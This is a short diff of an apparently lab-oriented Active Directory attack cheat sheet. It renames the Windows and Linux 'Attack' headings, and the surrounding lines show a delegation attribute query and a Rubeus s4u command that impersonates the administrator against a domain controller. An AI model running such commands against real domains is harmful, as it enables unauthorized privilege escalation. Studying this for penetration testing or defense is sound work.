@@ -413,8 +413,8 @@ Get-DomainController
 Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
 ```
 
-### Attack
-#### Windows
+### Attack from Windows
+
 
 **Creating a Computer Object**
 ```shell
@@ -453,7 +453,7 @@ Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofother
 ./rubeus.exe s4u /user:fake01$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/DC.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 
-#### Linux 
+### Attack from Linux 
 
 ```bash
 # from support machine htb
